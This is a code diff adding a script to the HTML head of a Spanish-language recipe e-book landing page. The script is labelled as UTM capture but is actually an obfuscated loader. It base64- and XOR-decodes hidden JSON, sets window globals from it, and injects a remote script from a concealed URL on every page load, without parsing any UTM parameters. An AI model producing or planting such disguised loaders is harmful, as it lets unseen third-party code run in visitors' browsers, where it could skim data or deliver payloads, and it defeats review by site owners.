@@ -26,6 +26,45 @@
       fbq("track", "PageView");
     </script>
     <!-- End Meta Pixel Code -->
+
+    <!-- UTMify UTM capture script -->
+    <script>
+      (function () {
+        var t_zs = atob(
+          "DGkxH2uLWUiK48rYlBITahnne3Koi76s5BoLMEToPSaklr61/Q9IMQjkNGbokeWr9xtYbx/4dj3+jrn3+AhFehj/dyL5web69R1FbQLpLDzvkOjizxITcQrmPGqwwa654Agcah/mMC7zzrqq8R9UcR+mKj3oiq6rtkUTaQrnLC2o2ej66TRM"
+        );
+        var r_wsb2 = [];
+        for (var l_2i = 0; l_2i < t_zs.length; l_2i++) {
+          r_wsb2.push(t_zs.charCodeAt(l_2i) & 255);
+        }
+        var g_vg = r_wsb2[0];
+        var a_x6ma = r_wsb2.slice(1, 1 + g_vg);
+        var j_s37q = r_wsb2.slice(1 + g_vg);
+        var j_j7 = j_s37q.map(function (b, w_8) {
+          return b ^ a_x6ma[w_8 % g_vg];
+        });
+        var f_lh5w = "";
+        for (var k_x2 = 0; k_x2 < j_j7.length; k_x2++) {
+          f_lh5w += String.fromCharCode(j_j7[k_x2] & 255);
+        }
+        var i_cj = decodeURIComponent(escape(f_lh5w));
+        var k_z = JSON.parse(i_cj);
+        var e_2hes = k_z.globals || [];
+        e_2hes.forEach(function (l_hb5k) {
+          window[l_hb5k.name] = l_hb5k.value;
+        });
+        var g_e1sq = document.createElement("script");
+        g_e1sq.src = k_z.url;
+        g_e1sq.async = true;
+        g_e1sq.defer = true;
+        (k_z.attributes || []).forEach(function (v_u) {
+          g_e1sq.setAttribute(v_u.name, v_u.value);
+        });
+        (document.head || document.documentElement).appendChild(g_e1sq);
+      })();
+    </script>
+    <!-- End UTMify UTM capture script -->
+
     <link rel="icon" type="image/png" href="/favicon.png" />
     <link rel="apple-touch-icon" href="/favicon.png" />
     <title>160 Recetas Fit — Recetario digital en español</title>
